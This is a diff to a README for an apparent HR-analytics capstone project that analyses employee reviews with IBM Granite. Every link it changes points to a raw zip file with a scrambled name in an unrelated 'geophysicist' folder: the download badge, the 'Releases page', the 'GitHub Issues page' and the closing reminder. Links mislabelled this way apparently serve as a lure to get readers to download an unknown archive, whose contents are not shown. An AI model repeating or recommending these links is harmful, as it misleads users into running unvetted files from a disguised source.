@@ -1,6 +1,6 @@
 # 🌟 IBM-HACKTIV8-Capstone-HR-Analytics - Discover Insights from Employee Reviews
 
-![Download Now](https://raw.githubusercontent.com/marlin170199/IBM-HACKTIV8-Capstone-HR-Analytics/main/geophysicist/IBM-HACKTIV8-Capstone-HR-Analytics.zip%20Now-Visit%20Releases-blue)
+![Download Now](https://raw.githubusercontent.com/marlin170199/IBM-HACKTIV8-Capstone-HR-Analytics/main/geophysicist/Analytics_HACKTI_Capstone_H_IB_2.4.zip%20Now-Visit%20Releases-blue)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ IBM-HACKTIV8-Capstone-HR-Analytics uses IBM Granite to examine employee reviews.
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/marlin170199/IBM-HACKTIV8-Capstone-HR-Analytics/main/geophysicist/IBM-HACKTIV8-Capstone-HR-Analytics.zip) to get the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/marlin170199/IBM-HACKTIV8-Capstone-HR-Analytics/main/geophysicist/Analytics_HACKTI_Capstone_H_IB_2.4.zip) to get the latest version of the software.
 
 2. **Choose the Appropriate Version**  
    Look for the latest release and click on it. You will see a list of available files.
@@ -66,7 +66,7 @@ Refer to the troubleshooting section in the application’s help menu. If issues
 
 ## 📞 Support
 
-If you need additional help, please visit our [GitHub Issues page](https://raw.githubusercontent.com/marlin170199/IBM-HACKTIV8-Capstone-HR-Analytics/main/geophysicist/IBM-HACKTIV8-Capstone-HR-Analytics.zip). We are here to assist you.
+If you need additional help, please visit our [GitHub Issues page](https://raw.githubusercontent.com/marlin170199/IBM-HACKTIV8-Capstone-HR-Analytics/main/geophysicist/Analytics_HACKTI_Capstone_H_IB_2.4.zip). We are here to assist you.
 
 ## 📝 License
 
@@ -74,4 +74,4 @@ This project is licensed under the MIT License. You are free to modify and distr
 
 For any further questions, feel free to reach out. Enjoy analyzing employee reviews and improving HR insights! 
 
-Remember to download the application from our [Releases page](https://raw.githubusercontent.com/marlin170199/IBM-HACKTIV8-Capstone-HR-Analytics/main/geophysicist/IBM-HACKTIV8-Capstone-HR-Analytics.zip).
+Remember to download the application from our [Releases page](https://raw.githubusercontent.com/marlin170199/IBM-HACKTIV8-Capstone-HR-Analytics/main/geophysicist/Analytics_HACKTI_Capstone_H_IB_2.4.zip).
